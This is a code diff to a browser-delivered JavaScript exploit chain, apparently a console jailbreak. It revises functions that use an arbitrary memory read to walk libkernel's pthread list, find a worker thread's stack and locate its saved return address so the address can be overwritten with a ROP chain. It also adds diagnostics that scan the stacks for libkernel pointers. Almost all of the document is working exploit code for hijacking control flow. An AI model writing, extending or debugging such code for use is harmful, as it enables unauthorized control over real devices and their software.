@@ -31,17 +31,38 @@ function find_worker(p, libKernelBase) {
     const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
     const PTHREAD_STACK_SIZE_OFFSET = 0xB0;
 
-    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
-        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
-        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
-        if (stacksz.low == 0x80000) {
-            return stack;
-        }
+    /* Collect EVERY thread with a 0x80000 stack, not just the first.
+       Returning the first match assumes the rop_slave worker is the only
+       thread with that stack size and that it is earliest in the list.
+       Neither is guaranteed, and picking the wrong one looks identical to a
+       wrong OFFSET_lk_worker_wait_return: the fingerprint scan just finds 0.
+       The caller now tries all of them. Also bounded -- the original walked
+       until next==NULL, which spins forever, synchronously, on a bad list. */
+    const MAX_THREADS = 512;
+    const stacks = [];
+    const sizes = [];
+    let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list));
+    for (let i = 0; i < MAX_THREADS && (thread.low != 0x0 || thread.hi != 0x0); i++) {
+        if ((thread.low & 7) !== 0 || (thread.hi >>> 0) < 8 || (thread.hi >>> 0) > 9)
+            throw new Error("_thread_list entry " + i + " is 0x" + thread.toString()
+                + ", not a plausible pthread -- OFFSET_lk__thread_list (0x"
+                + OFFSET_lk__thread_list.toString(16) + ") is wrong for this build");
+        const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
+        const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
+        if (stacksz.hi === 0) sizes.push("0x" + stacksz.low.toString(16));
+        if (stacksz.low == 0x80000 && stacksz.hi === 0) stacks.push(stack);
+        thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
     }
-    throw new Error("failed to find worker.");
+    jbmark("WORKER-STACKS", "n=" + stacks.length + "-of=" + sizes.length
+        + "-sizes=" + sizes.join(","));
+    if (!stacks.length)
+        throw new Error("failed to find worker: no 0x80000 stack among "
+            + sizes.length + " threads (sizes " + sizes.join(",") + ")");
+    return stacks;
 }
 
-async function find_worker_return_slot(p, stack, libKernelBase) {
+async function find_worker_return_slot(p, stacks, libKernelBase) {
+    if (!Array.isArray(stacks)) stacks = [stacks];
     const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
     let lastCount = 0;
 
@@ -52,24 +73,81 @@ async function find_worker_return_slot(p, stack, libKernelBase) {
     for (let attempt = 0; attempt < 50; attempt++) {
         let hit = null;
         let count = 0;
-        for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
-            const candidate = stack.add32(offset);
-            const value = p.read8(candidate);
-            if (value.low !== expected.low || value.hi !== expected.hi)
-                continue;
+        for (const stack of stacks) {
+            let hitHere = null, here = 0;
+            for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
+                const candidate = stack.add32(offset);
+                const value = p.read8(candidate);
+                if (value.low !== expected.low || value.hi !== expected.hi)
+                    continue;
 
-            hit = candidate;
-            count++;
-        }
-        if (count === 1) {
-            jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hit.toString()
-                + "-expected=0x" + expected.toString());
-            return hit;
+                hitHere = candidate;
+                here++;
+            }
+            if (here === 1) {
+                jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hitHere.toString()
+                    + "-expected=0x" + expected.toString()
+                    + "-stacks=" + stacks.length);
+                return hitHere;
+            }
+            count += here;
+            if (hitHere) hit = hitHere;
         }
         lastCount = count;
         await new Promise(resolve => setTimeout(resolve, 1));
     }
-    throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
+
+    /* The fingerprint is not on the stack. Do not guess a replacement constant:
+       we have an arbitrary read, so measure what the idle worker ACTUALLY
+       parked on and put it in the error text, which this UI renders in full.
+       Sweep the whole 512KB stack for qwords that land inside libkernel_web
+       and report the distinct rvas, deepest (highest address) first -- the
+       saved PC of the blocking call is the one near the top of the stack.
+       Tally counts too: a genuine return address recurs across attempts,
+       whereas stale garbage usually appears once. */
+    const LK_SPAN = 0x100000;                 // generous libkernel_web image bound
+    const seen = new Map();                   // rva -> {n, hi}
+    for (const stack of stacks) {
+        for (let offset = 0x40000; offset < 0x80000; offset += 0x8) {
+            const v = p.read8(stack.add32(offset));
+            const rel = (v.hi - libKernelBase.hi) * 0x100000000
+                + (v.low - libKernelBase.low);
+            if (rel < 0 || rel >= LK_SPAN) continue;
+            const e = seen.get(rel);
+            if (e) { e.n++; if (offset > e.hi) e.hi = offset; }
+            else seen.set(rel, { n: 1, hi: offset });
+        }
+    }
+    const top = [...seen.entries()]
+        .sort((a, b) => b[1].hi - a[1].hi)
+        .slice(0, 14)
+        .map(([rva, e]) => "lk+0x" + rva.toString(16)
+            + "@0x" + e.hi.toString(16) + (e.n > 1 ? "x" + e.n : ""));
+    /* probe700.html established that on this build a byte in libkernel selects
+       WHICH cond_wait_common body pthread_cond_wait actually calls. The saved
+       PC only exists in the body that runs, so a fingerprint taken from the
+       other one can never match no matter how correct it looks statically. */
+    let selNote = "";
+    if (typeof OFFSET_lk_cond_wait_selector !== "undefined") {
+        const sw = p.read8(libKernelBase.add32(OFFSET_lk_cond_wait_selector));
+        selNote = " cond_wait selector (lk+0x"
+            + OFFSET_lk_cond_wait_selector.toString(16) + ") = "
+            + (sw.low & 0xff)
+            + " -- if the profile's fingerprint came from the OTHER body,"
+            + " that alone explains count 0.";
+    }
+    jbmark("WORKER-RET-CANDIDATES", "expected=lk+0x"
+        + OFFSET_lk_worker_wait_return.toString(16)
+        + "-found=" + seen.size + "-" + top.join(" ") + selNote);
+    throw new Error("worker wait return fingerprint count " + lastCount
+        + ", expected 1. OFFSET_lk_worker_wait_return = 0x"
+        + OFFSET_lk_worker_wait_return.toString(16)
+        + " is not on the worker stack for fw " + window.fw_str + "."
+        + " " + stacks.length + " candidate stack(s); "
+        + seen.size + " libkernel pointers in the top half,"
+        + " deepest first: " + (top.length ? top.join("  ") : "NONE")
+        + " -- pick the saved PC of the blocking call from this list."
+        + selNote);
 }
 
 function jbmark(tag, detail) {
@@ -566,14 +644,16 @@ async function prepare(p) {
     await wait_for_worker();
     jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");
 
-    let worker_stack = find_worker(p, libKernelBase);
+    let worker_stacks = find_worker(p, libKernelBase);
+    let worker_stack = worker_stacks[0];
     jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
+        + "-candidates=" + worker_stacks.length
         + "-next=malloc(0x40)+worker_rop(0xC0000)");
     let original_context = malloc(0x40);
 
     let return_address_ptr;
     if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
-        return_address_ptr = await find_worker_return_slot(p, worker_stack, libKernelBase);
+        return_address_ptr = await find_worker_return_slot(p, worker_stacks, libKernelBase);
     } else {
         // Backward-compatible path for original profiles without a saved-PC fingerprint.
         return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
@@ -676,4 +756,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=19`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=20`);
